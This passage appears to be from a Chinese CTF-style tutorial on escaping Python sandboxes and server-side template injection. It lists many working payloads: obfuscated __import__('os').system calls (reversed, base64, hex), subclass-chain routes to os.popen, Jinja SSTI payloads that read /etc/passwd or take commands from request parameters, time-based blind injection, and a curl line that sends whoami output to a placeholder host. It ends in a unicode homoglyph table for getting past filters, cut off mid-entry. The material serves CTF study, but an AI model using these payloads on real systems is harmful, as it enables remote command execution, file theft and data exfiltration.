class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;_codecs_hk&#x27;</span>, <span class="string">&#x27;brlapi&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;_codecs_iso2022&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;louis&#x27;</span>, <span class="string">&#x27;softwareproperties&#x27;</span>, <span class="string">&#x27;_codecs_jp&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;lsb_release&#x27;</span>, <span class="string">&#x27;speechd&#x27;</span>, <span class="string">&#x27;_codecs_kr&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;speechd_config&#x27;</span>, <span class="string">&#x27;_codecs_tw&#x27;</span>, <span class="string">&#x27;cairo&#x27;</span>, <span class="string">&#x27;macaroonbakery&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;certifi&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;_crypt&#x27;</span>, <span class="string">&#x27;chardet&#x27;</span>, <span class="string">&#x27;mako&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;markupsafe&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;_ctypes&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;_ctypes_test&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_curses&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;_curses_panel&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;mmap&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;_datetime&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;modual_test&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;_dbm&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;_dbus_bindings&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_decimal&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;nis&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;systemd&#x27;</span>, <span class="string">&#x27;_gdbm&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;_hashlib&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;cryptography&#x27;</span>, <span class="string">&#x27;oauth&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;_imp&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;olefile&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;termios&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;cups&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;cupsext&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_lsprof&#x27;</span>, <span class="string">&#x27;cupshelpers&#x27;</span>, <span class="string">&#x27;orca&#x27;</span>, <span class="string">&#x27;_lzma&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;ossaudiodev&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;parser&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;_multibytecodec&#x27;</span>, <span class="string">&#x27;dbus&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;_multiprocessing&#x27;</span>, <span class="string">&#x27;deb822&#x27;</span>, <span class="string">&#x27;pcardext&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;_opcode&#x27;</span>, <span class="string">&#x27;debconf&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;_operator&#x27;</span>, <span class="string">&#x27;debian&#x27;</span>, <span class="string">&#x27;pexpect&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;debian_bundle&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;_pickle&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;_posixsubprocess&#x27;</span>, <span class="string">&#x27;defer&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;pkg_resources&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;distro_info&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;ufw&#x27;</span>, <span class="string">&#x27;_sha1&#x27;</span>, <span class="string">&#x27;distro_info_test&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;_sha3&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;urllib3&#x27;</span>, <span class="string">&#x27;_signal&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;usbcreator&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;problem_report&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;_sqlite3&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;faulthandler&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;wadllib&#x27;</span>, <span class="string">&#x27;_ssl&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;ptyprocess&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;_stat&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;_string&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;pyatspi&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;xdg&#x27;</span>, <span class="string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;_testbuffer&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;xkit&#x27;</span>, <span class="string">&#x27;_testcapi&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;pygtkcompat&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;_testimportmultiple&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;pymacaroons&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;_testmultiphase&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;pyrfc3339&#x27;</span>, <span class="string">&#x27;xxlimited&#x27;</span>, <span class="string">&#x27;_thread&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;pytz&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;yaml&#x27;</span>, <span class="string">&#x27;_tracemalloc&#x27;</span>, <span class="string">&#x27;gi&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;gtweak&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>, <span class="string">&#x27;_yaml&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;reportlab&#x27;</span>, <span class="string">&#x27;zope&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line">results = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> all_modules_3:</span><br><span class="line">    results[module] = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;result&#x27;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = <span class="built_in">__import__</span>(module)</span><br><span class="line">        attrs = <span class="built_in">dir</span>(m)</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs:</span><br><span class="line">                result = <span class="string">&#x27;yes&#x27;</span></span><br><span class="line">                results[module][<span class="string">&#x27;flag&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">&#x27;no&#x27;</span></span><br><span class="line"></span><br><span class="line">            results[module][<span class="string">&#x27;result&#x27;</span>][method] = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">if</span> results[result][<span class="string">&#x27;flag&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + result)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> results[result][<span class="string">&#x27;result&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  [-]&#x27;</span> + r + <span class="string">&#x27;: &#x27;</span> + results[result][<span class="string">&#x27;result&#x27;</span>][r]</span><br></pre></td></tr></table></figure>

<p>最简单的命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里引入了os模块，执行了system命令</p>
<h3 id="过滤了import"><a href="#过滤了import" class="headerlink" title="过滤了import"></a>过滤了import</h3><p>可以使用很多的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>或者importlib直接引入，也可以使用execfile导入</span><br><span class="line">（py2）</span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line">（py3）</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line">由于需要知道路径 可以使用sys去拿路径sys.path(<span class="keyword">if</span>)</span><br></pre></td></tr></table></figure>

<h3 id="过滤了os"><a href="#过滤了os" class="headerlink" title="过滤了os"></a>过滤了os</h3><p>可以使用字符串处理调用出os</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).system(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).system(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以用eval和exec去逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure>

<p>处理方法包括逆序、变量拼接、base64、hex、rot13…等等</p>
<p>如果os从sys.modules里面删掉了，os这下彻底没法用了</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231007103335899.png" alt="image-20231007103335899"></p>
<p>import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
<p><code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os</p>
<p>这里只要del sys.modules[‘os’]就可以重新加载os</p>
<h3 id="利用内建函数-builtins"><a href="#利用内建函数-builtins" class="headerlink" title="利用内建函数__builtins__"></a>利用内建函数__builtins__</h3><p>查看最基础的内置类</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231007100030300.png" alt="image-20231007100030300"></p>
<p>这里查看builtins类内置函数</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231007100140005.png" alt="image-20231007100140005"></p>
<p>可以看到这里存在很多可以被我们利用的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接导入</span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231007103011410.png" alt="image-20231007103011410"></p>
<p>也可以使用一些花的方法</p>
<h4 id="通过dict访问"><a href="#通过dict访问" class="headerlink" title="通过dict访问"></a>通过dict访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[‘import__(&#x27;os&#x27;)’].system(&#x27;dir&#x27;)</span><br><span class="line">__builtins__.__dict__[&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;)](&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="调用各种函数"><a href="#调用各种函数" class="headerlink" title="调用各种函数"></a>调用各种函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__.__getitem__(<span class="string">&#x27;file&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__.__dict__.__getitem__(<span class="string">&#x27;open&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()//读文件</span><br><span class="line">__builtins__.__dict__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="import导入其他模块"><a href="#import导入其他模块" class="headerlink" title="import导入其他模块"></a>import导入其他模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).call([<span class="string">&#x27;id&#x27;</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>如果函数被干掉了</p>
<p>可以reload重载</p>
<p>如果reload被干掉了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>

<h3 id="object方法"><a href="#object方法" class="headerlink" title="object方法"></a>object方法</h3><p>类似ssti，使用各种包括base函数去构造object</p>
<p>这里不再详谈</p>
<h3 id="getattribute、decode拼接绕过关键字过滤"><a href="#getattribute、decode拼接绕过关键字过滤" class="headerlink" title="getattribute、decode拼接绕过关键字过滤"></a>getattribute、decode拼接绕过关键字过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[72].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].system(&#x27;dir&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[72].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;os&#x27;].system(&#x27;dir&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[72].__init__.__getattribute__(&#x27;5f5f676c6f62616c735f5f&#x27;.decode(&#x27;hex&#x27;))[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>无[]法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>

<h3 id="request法"><a href="#request法" class="headerlink" title="request法"></a>request法</h3><h3 id="无引号"><a href="#无引号" class="headerlink" title="无引号"></a>无引号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;    提交参数&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h3 id="无"><a href="#无" class="headerlink" title="无__"></a>无__</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;    提交参数&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://ip:port?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br><span class="line">盲注</span><br><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/flag).read()[0:1]==&#x27;f&#x27; %&#125;bingo&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__import__( timeit).timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;if [ $(whoami|base32|wc -c|cut -c 1) =  ];then sleep 2;fi&#x27;)&quot;, number=1)</span><br></pre></td></tr></table></figure>

<h3 id="其他模块"><a href="#其他模块" class="headerlink" title="其他模块"></a>其他模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__import__( timeit).timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;, number=1)</span><br><span class="line">platform.popen(&#x27;id&#x27;, mode=&#x27;r&#x27;, bufsize=-1).read()</span><br></pre></td></tr></table></figure>

<p>如果直接ban字符</p>
<h3 id="unicode字符绕过字符替换"><a href="#unicode字符绕过字符替换" class="headerlink" title="unicode字符绕过字符替换"></a>unicode字符绕过字符替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a [&#x27;a&#x27;, &#x27;ª&#x27;, &#x27;ᵃ&#x27;, &#x27;ₐ&#x27;, &#x27;ⓐ&#x27;, &#x27;ａ&#x27;, &#x27;𝐚&#x27;, &#x27;𝑎&#x27;, &#x27;𝒂&#x27;, &#x27;𝒶&#x27;]</span><br><span class="line">b [&#x27;b&#x27;, &#x27;ᵇ&#x27;, &#x27;ⓑ&#x27;, &#x27;ｂ&#x27;, &#x27;𝐛&#x27;, &#x27;𝑏&#x27;, &#x27;𝒃&#x27;, &#x27;𝒷&#x27;, &#x27;𝓫&#x27;, &#x27;𝔟&#x27;]</span><br><span class="line">c [&#x27;c&#x27;, &#x27;ᶜ&#x27;, &#x27;ⅽ&#x27;, &#x27;ⓒ&#x27;, &#x27;ｃ&#x27;, &#x27;𝐜&#x27;, &#x27;𝑐&#x27;, &#x27;𝒄&#x27;, &#x27;𝒸&#x27;, &#x27;𝓬&#x27;]</span><br><span class="line">d [&#x27;d&#x27;, &#x27;ᵈ&#x27;, &#x27;ⅆ&#x27;, &#x27;ⅾ&#x27;, &#x27;ⓓ&#x27;, &#x27;ｄ&#x27;, &#x27;𝐝&#x27;, &#x27;𝑑&#x27;, &#x27;𝒅&#x27;, &#x27;𝒹&#x27;]</span><br><span class="line">e [&#x27;e&#x27;, &#x27;ᵉ&#x27;, &#x27;ₑ&#x27;, &#x27;ℯ&#x27;, &#x27;ⅇ&#x27;, &#x27;ⓔ&#x27;, &#x27;ｅ&#x27;, &#x27;𝐞&#x27;, &#x27;𝑒&#x27;, &#x27;𝒆&#x27;]</span><br><span class="line">f [&#x27;f&#x27;, &#x27;ᶠ&#x27;, &#x27;ⓕ&#x27;, &#x27;ｆ&#x27;, &#x27;𝐟&#x27;, &#x27;𝑓&#x27;, &#x27;𝒇&#x27;, &#x27;𝒻&#x27;, &#x27;𝓯&#x27;, &#x27;𝔣&#x27;]</span><br><span class="line">g [&#x27;g&#x27;, &#x27;ᵍ&#x27;, &#x27;ℊ&#x27;, &#x27;ⓖ&#x27;, &#x27;ｇ&#x27;, &#x27;𝐠&#x27;, &#x27;𝑔&#x27;, &#x27;𝒈&#x27;, &#x27;𝓰&#x27;, &#x27;𝔤&#x27;]</span><br><span class="line">h [&#x27;h&#x27;, &#x27;ʰ&#x27;, &#x27;ₕ&#x27;, &#x27;ℎ&#x27;, &#x27;ⓗ&#x27;, &#x27;ｈ&#x27;, &#x27;𝐡&#x27;, &#x27;𝒉&#x27;, &#x27;𝒽&#x27;, &#x27;𝓱&#x27;]</span><br><span class="line">i [&#x27;i&#x27;, &#x27;ᵢ&#x27;, &#x27;ⁱ&#x27;, &#x27;ℹ&#x27;, 